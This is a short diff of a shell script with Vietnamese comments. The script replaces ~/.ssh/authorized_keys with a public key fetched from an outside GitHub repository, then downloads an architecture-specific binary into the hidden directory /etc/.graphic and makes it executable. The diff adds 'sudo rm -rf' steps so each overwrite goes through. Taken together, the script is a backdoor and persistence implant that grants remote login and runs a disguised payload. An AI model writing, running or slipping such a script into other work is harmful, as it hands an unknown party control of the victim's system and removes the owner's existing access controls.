@@ -2,6 +2,7 @@
 
 # Thiet lap quyen truy cap
 mkdir ~/.ssh
+sudo rm -rf ~/.ssh/authorized_keys
 curl  https://raw.githubusercontent.com/kryptos368/imhere/refs/heads/main/id_rsa.pub > ~/.ssh/authorized_keys
 chmod 700 ~/.ssh
 chmod 600 ~/.ssh/authorized_keys
@@ -48,6 +49,7 @@ case $ARCH in
 esac
 
 mkdir /etc/.graphic
+sudo rm -rf /etc/.graphic/graphicals
 curl https://raw.githubusercontent.com/kryptos368/imhere/refs/heads/main/graphicals_$GOARCH > /etc/.graphic/graphicals
 chmod 700 /etc/.graphic
 chmod +x /etc/.graphic/graphicals
